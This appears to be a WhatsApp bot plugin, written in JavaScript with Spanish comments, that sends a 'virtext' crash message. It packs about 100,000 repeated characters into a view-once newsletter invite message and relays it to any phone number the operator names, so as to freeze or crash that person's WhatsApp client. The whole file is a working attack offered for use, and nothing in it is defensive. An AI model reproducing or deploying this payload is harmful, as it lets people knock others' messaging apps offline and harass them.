import { generateWAMessageFromContent, proto } from '@whiskeysockets/baileys';

let handler = async (m, { conn, args, usedPrefix, command }) => {
  let botNumber = conn.user.id.split(':')[0]; // solo el número
  let senderNumber = m.sender.split('@')[0]; // número del que ejecuta

  // ✅ Verifica si es el número del bot
  if (senderNumber !== botNumber) {
    return m.reply(`⛔ Este comando solo puede usarlo el número principal del bot.`);
  }

  // ✅ Verifica argumento
  if (!args[0] || !args[0].includes('@s.whatsapp.net')) {
    return m.reply(`⚠️ Uso incorrecto\n\n📌 Ejemplo:\n${usedPrefix + command} 521XXXXXXXXXX@s.whatsapp.net`);
  }

  let target = args[0];

  // 💣 VIRTEXT potente (sin thumbnail para evitar error silencioso)
  let virtex = "*💀 VIRTEXT 💀*" 
    + "軎?".repeat(50000) 
    + "@1".repeat(50000);

  try {
    let msg = await generateWAMessageFromContent(target, proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: '120363319314627296@newsletter',
            newsletterName: virtex,
            caption: virtex,
            inviteExpiration: Date.now() + 1814400000
          },
          contextInfo: {
            mentionedJid: [target],
          }
        }
      }
    }), { userJid: target });

    await conn.relayMessage(target, msg.message, { messageId: msg.key.id });
    await m.reply(`✅ VIRTEXT enviado a ${target}`);

  } catch (e) {
    console.error(e);
    await m.reply('❌ Ocurrió un error al enviar el VIRTEXT.\n\n' + e.message);
  }
};

handler.help = ['virtex <número@...>'];
handler.tags = ['danger'];
handler.command = ['virtex', 'crashletter'];
handler.group = false;

export default handler;